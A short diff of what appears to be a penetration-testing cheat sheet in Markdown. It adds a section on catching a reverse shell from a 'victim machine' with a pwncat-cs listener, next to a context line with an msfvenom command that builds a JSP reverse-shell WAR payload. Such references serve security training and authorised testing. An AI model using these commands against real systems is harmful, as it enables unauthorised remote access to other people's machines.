@@ -223,6 +223,17 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<listener_ip> LPORT=1234 -f war > r
 
 ---
 
+## Get interactive listener
+
+Using Pwncat
+
+```bash
+pwncat-cs -p <port>
+#then CTRL+D to move to the victim machine
+```
+
+---
+
 ## Get better BASH shell 
 
 Using socat
